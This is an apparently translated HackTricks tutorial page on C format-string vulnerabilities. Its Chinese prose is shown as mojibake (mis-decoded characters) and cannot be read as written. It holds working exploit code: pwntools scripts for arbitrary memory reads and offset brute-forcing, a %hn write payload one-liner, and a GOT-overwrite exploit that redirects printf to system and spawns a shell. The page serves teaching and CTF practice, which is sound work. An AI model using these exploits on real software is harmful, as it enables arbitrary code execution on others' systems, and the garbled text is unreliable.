# æ ¼å¼å­—ç¬¦ä¸²

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

åœ¨ C ä¸­ï¼Œ**`printf`** æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨æ¥ **æ‰“å°** å­—ç¬¦ä¸²çš„å‡½æ•°ã€‚è¯¥å‡½æ•°æœŸæœ›çš„ **ç¬¬ä¸€ä¸ªå‚æ•°** æ˜¯ **å¸¦æ ¼å¼çš„åŸå§‹æ–‡æœ¬**ã€‚åç»­çš„ **å‚æ•°** æ˜¯ **æ›¿ä»£** åŸå§‹æ–‡æœ¬ä¸­ **æ ¼å¼åŒ–ç¬¦** çš„ **å€¼**ã€‚

å…¶ä»–æ˜“å—æ”»å‡»çš„å‡½æ•°åŒ…æ‹¬ **`sprintf()`** å’Œ **`fprintf()`**ã€‚

å½“ **æ”»å‡»è€…çš„æ–‡æœ¬ä½œä¸ºè¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°** æ—¶ï¼Œå°±ä¼šå‡ºç°æ¼æ´ã€‚æ”»å‡»è€…å°†èƒ½å¤Ÿæ„é€ ä¸€ä¸ª **ç‰¹æ®Šè¾“å…¥ï¼Œåˆ©ç”¨** **printf æ ¼å¼** å­—ç¬¦ä¸²çš„èƒ½åŠ›æ¥è¯»å–å’Œ **å†™å…¥ä»»ä½•åœ°å€ï¼ˆå¯è¯»/å¯å†™ï¼‰** ä¸­çš„ **ä»»ä½•æ•°æ®**ã€‚è¿™æ ·å°±èƒ½å¤Ÿ **æ‰§è¡Œä»»æ„ä»£ç **ã€‚

#### æ ¼å¼åŒ–ç¬¦ï¼š
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%p â€”> Pointer
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**ç¤ºä¾‹ï¼š**

* æ¼æ´ç¤ºä¾‹ï¼š
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* æ­£å¸¸ä½¿ç”¨ï¼š
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* ç¼ºå°‘å‚æ•°ï¼š
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
* fprintf æ¼æ´ï¼š
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
char *user_input;
user_input = argv[1];
FILE *output_file = fopen("output.txt", "w");
fprintf(output_file, user_input); // The user input cna include formatters!
fclose(output_file);
return 0;
}
```
### **è®¿é—®æŒ‡é’ˆ**

æ ¼å¼ **`%<n>$x`**ï¼Œå…¶ä¸­ `n` æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œå…è®¸æŒ‡ç¤º printf é€‰æ‹©ç¬¬ n ä¸ªå‚æ•°ï¼ˆæ¥è‡ªæ ˆï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æƒ³ä½¿ç”¨ printf è¯»å–æ ˆä¸­çš„ç¬¬ 4 ä¸ªå‚æ•°ï¼Œæ‚¨å¯ä»¥è¿™æ ·åšï¼š
```c
printf("%x %x %x %x")
```
å¹¶ä¸”ä½ ä¼šä»ç¬¬ä¸€ä¸ªå‚æ•°è¯»å–åˆ°ç¬¬å››ä¸ªå‚æ•°ã€‚

æˆ–è€…ä½ å¯ä»¥è¿™æ ·åšï¼š
```c
printf("$4%x")
```
å¹¶ç›´æ¥è¯»å–ç¬¬å››ä¸ªã€‚

æ³¨æ„ï¼Œæ”»å‡»è€…æ§åˆ¶äº† `pr`**`intf` å‚æ•°ï¼Œè¿™åŸºæœ¬ä¸Šæ„å‘³ç€** ä»–çš„è¾“å…¥å°†åœ¨è°ƒç”¨ `printf` æ—¶ä½äºæ ˆä¸­ï¼Œè¿™æ„å‘³ç€ä»–å¯ä»¥åœ¨æ ˆä¸­å†™å…¥ç‰¹å®šçš„å†…å­˜åœ°å€ã€‚

{% hint style="danger" %}
æ§åˆ¶æ­¤è¾“å…¥çš„æ”»å‡»è€…å°†èƒ½å¤Ÿ **åœ¨æ ˆä¸­æ·»åŠ ä»»æ„åœ°å€å¹¶ä½¿ `printf` è®¿é—®å®ƒä»¬**ã€‚åœ¨ä¸‹ä¸€èŠ‚ä¸­å°†è§£é‡Šå¦‚ä½•åˆ©ç”¨è¿™ç§è¡Œä¸ºã€‚
{% endhint %}

## **ä»»æ„è¯»å–**

å¯ä»¥ä½¿ç”¨æ ¼å¼åŒ–ç¬¦ **`%n$s`** ä½¿ **`printf`** è·å–ä½äº **n ä½ç½®** çš„ **åœ°å€**ï¼Œå¹¶ **å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²æ‰“å°**ï¼ˆæ‰“å°ç›´åˆ°æ‰¾åˆ° 0x00ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºåœ°å€æ˜¯ **`0x8048000`**ï¼Œå¹¶ä¸”æˆ‘ä»¬çŸ¥é“ç”¨æˆ·è¾“å…¥ä»æ ˆçš„ç¬¬ 4 ä¸ªä½ç½®å¼€å§‹ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ‰“å°äºŒè¿›åˆ¶æ–‡ä»¶çš„å¼€å¤´ï¼š
```python
from pwn import *

p = process('./bin')

payload = b'%6$s' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œæ‚¨ä¸èƒ½å°†åœ°å€ 0x8048000 æ”¾åœ¨è¾“å…¥çš„å¼€å¤´ï¼Œå› ä¸ºå­—ç¬¦ä¸²å°†åœ¨è¯¥åœ°å€çš„æœ«å°¾è¢«æˆªæ–­ä¸º 0x00ã€‚
{% endhint %}

### æŸ¥æ‰¾åç§»é‡

è¦æ‰¾åˆ°è¾“å…¥çš„åç§»é‡ï¼Œæ‚¨å¯ä»¥å‘é€ 4 æˆ– 8 ä¸ªå­—èŠ‚ï¼ˆ`0x41414141`ï¼‰ï¼Œåè·Ÿ **`%1$x`** å¹¶ **å¢åŠ ** å€¼ï¼Œç›´åˆ°æ£€ç´¢åˆ° `A's`ã€‚

<details>

<summary>æš´åŠ›ç ´è§£ printf åç§»é‡</summary>
```python
# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers
for i in range(10):
# Construct a payload that includes the current integer as offset
payload = f"AAAA%{i}$x".encode()

# Start a new process of the "chall" binary
p = process("./chall")

# Send the payload to the process
p.sendline(payload)

# Read and store the output of the process
output = p.clean()

# Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
if b"41414141" in output:
# If the string is found, log the success message and break out of the loop
log.success(f"User input is at offset : {i}")
break

# Close the process
p.close()
```
</details>

### æœ‰å¤šæœ‰ç”¨

ä»»æ„è¯»å–å¯ä»¥ç”¨äºï¼š

* **ä»å†…å­˜ä¸­è½¬å‚¨** **äºŒè¿›åˆ¶æ–‡ä»¶**
* **è®¿é—®å­˜å‚¨æ•æ„Ÿ** **ä¿¡æ¯**çš„å†…å­˜ç‰¹å®šéƒ¨åˆ†ï¼ˆå¦‚é‡‘ä¸é›€ã€åŠ å¯†å¯†é’¥æˆ–è‡ªå®šä¹‰å¯†ç ï¼Œå¦‚åœ¨è¿™ä¸ª [**CTF æŒ‘æˆ˜**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value) ä¸­ï¼‰

## **ä»»æ„å†™å…¥**

æ ¼å¼åŒ–å™¨ **`$<num>%n`** **åœ¨** **æŒ‡å®šåœ°å€**ä¸­å†™å…¥**å·²å†™å…¥å­—èŠ‚çš„æ•°é‡**ï¼Œè¯¥åœ°å€åœ¨æ ˆä¸­çš„ \<num> å‚æ•°ä¸­ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ printf å†™å…¥ä»»æ„æ•°é‡çš„å­—ç¬¦ï¼Œä»–å°†èƒ½å¤Ÿä½¿ **`$<num>%n`** åœ¨ä»»æ„åœ°å€å†™å…¥ä»»æ„æ•°å­—ã€‚

å¹¸è¿çš„æ˜¯ï¼Œè¦å†™å…¥æ•°å­— 9999ï¼Œå¹¶ä¸éœ€è¦åœ¨è¾“å…¥ä¸­æ·»åŠ  9999 ä¸ª "A"ï¼Œä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨æ ¼å¼åŒ–å™¨ **`%.<num-write>%<num>$n`** åœ¨ **`num` ä½ç½®æŒ‡å‘çš„åœ°å€**ä¸­å†™å…¥æ•°å­— **`<num-write>`**ã€‚
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œé€šå¸¸ä¸ºäº†å†™å…¥ä¸€ä¸ªåœ°å€ï¼Œä¾‹å¦‚ `0x08049724`ï¼ˆè¿™æ˜¯ä¸€ä¸ªä¸€æ¬¡æ€§å†™å…¥çš„å·¨å¤§æ•°å­—ï¼‰ï¼Œ**ä½¿ç”¨çš„æ˜¯ `$hn`** è€Œä¸æ˜¯ `$n`ã€‚è¿™å…è®¸**åªå†™å…¥ 2 å­—èŠ‚**ã€‚å› æ­¤ï¼Œè¿™ä¸ªæ“ä½œéœ€è¦è¿›è¡Œä¸¤æ¬¡ï¼Œä¸€æ¬¡å†™å…¥åœ°å€çš„é«˜ 2 å­—èŠ‚ï¼Œå¦ä¸€æ¬¡å†™å…¥ä½ 2 å­—èŠ‚ã€‚

å› æ­¤ï¼Œè¿™ä¸ªæ¼æ´å…è®¸**åœ¨ä»»ä½•åœ°å€å†™å…¥ä»»ä½•å†…å®¹ï¼ˆä»»æ„å†™å…¥ï¼‰ã€‚**

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç›®æ ‡æ˜¯**è¦†ç›–**ä¸€ä¸ª**å‡½æ•°**åœ¨**GOT**è¡¨ä¸­çš„**åœ°å€**ï¼Œè¯¥å‡½æ•°å°†åœ¨ç¨åè¢«è°ƒç”¨ã€‚å°½ç®¡è¿™å¯ä»¥æ»¥ç”¨å…¶ä»–ä»»æ„å†™å…¥åˆ°æ‰§è¡Œçš„æŠ€æœ¯ï¼š

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

æˆ‘ä»¬å°†**è¦†ç›–**ä¸€ä¸ª**å‡½æ•°**ï¼Œè¯¥å‡½æ•°**æ¥æ”¶**æ¥è‡ª**ç”¨æˆ·**çš„**å‚æ•°**å¹¶**æŒ‡å‘****`system`** **å‡½æ•°**ã€‚\
å¦‚å‰æ‰€è¿°ï¼Œå†™å…¥åœ°å€é€šå¸¸éœ€è¦ 2 ä¸ªæ­¥éª¤ï¼šæ‚¨**é¦–å…ˆå†™å…¥åœ°å€çš„ 2 å­—èŠ‚**ï¼Œç„¶åå†™å…¥å¦å¤– 2 å­—èŠ‚ã€‚ä¸ºæ­¤ä½¿ç”¨**`$hn`**ã€‚

* **HOB** è¢«è°ƒç”¨ä¸ºåœ°å€çš„ 2 ä¸ªé«˜å­—èŠ‚
* **LOB** è¢«è°ƒç”¨ä¸ºåœ°å€çš„ 2 ä¸ªä½å­—èŠ‚

ç„¶åï¼Œç”±äºæ ¼å¼å­—ç¬¦ä¸²çš„å·¥ä½œæ–¹å¼ï¼Œæ‚¨éœ€è¦**é¦–å…ˆå†™å…¥è¾ƒå°çš„** \[HOB, LOB]ï¼Œç„¶åå†™å…¥å¦ä¸€ä¸ªã€‚

å¦‚æœ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

å¦‚æœ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntools æ¨¡æ¿

æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°ç”¨äºå‡†å¤‡æ­¤ç±»æ¼æ´çš„**æ¨¡æ¿**ï¼š

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

æˆ–è€…å¯ä»¥ä»[**è¿™é‡Œ**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite)æ‰¾åˆ°è¿™ä¸ªåŸºæœ¬ç¤ºä¾‹ï¼š
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## æ ¼å¼å­—ç¬¦ä¸²åˆ°ç¼“å†²åŒºæº¢å‡º

å¯ä»¥åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´çš„å†™å…¥æ“ä½œæ¥**å†™å…¥æ ˆçš„åœ°å€**ï¼Œå¹¶åˆ©ç”¨**ç¼“å†²åŒºæº¢å‡º**ç±»å‹çš„æ¼æ´ã€‚

## å…¶ä»–ç¤ºä¾‹ä¸å‚è€ƒ

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32ä½ï¼Œæ— relroï¼Œæ— canaryï¼Œnxï¼Œæ— pieï¼ŒåŸºæœ¬ä½¿ç”¨æ ¼å¼å­—ç¬¦ä¸²ä»æ ˆä¸­æ³„éœ²æ ‡å¿—ï¼ˆæ— éœ€æ›´æ”¹æ‰§è¡Œæµç¨‹ï¼‰
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32ä½ï¼Œrelroï¼Œæ— canaryï¼Œnxï¼Œæ— pieï¼Œæ ¼å¼å­—ç¬¦ä¸²è¦†ç›–åœ°å€`fflush`ä¸winå‡½æ•°ï¼ˆret2winï¼‰
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32ä½ï¼Œrelroï¼Œæ— canaryï¼Œnxï¼Œæ— pieï¼Œæ ¼å¼å­—ç¬¦ä¸²åœ¨`.fini_array`ä¸­å†™å…¥mainå†…éƒ¨çš„åœ°å€ï¼ˆä½¿æµç¨‹å†å¾ªç¯ä¸€æ¬¡ï¼‰å¹¶å°†åœ°å€å†™å…¥æŒ‡å‘`strlen`çš„GOTè¡¨ä¸­çš„`system`ã€‚å½“æµç¨‹è¿”å›åˆ°mainæ—¶ï¼Œ`strlen`ä¸ç”¨æˆ·è¾“å…¥ä¸€èµ·æ‰§è¡Œå¹¶æŒ‡å‘`system`ï¼Œå°†æ‰§è¡Œä¼ é€’çš„å‘½ä»¤ã€‚

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
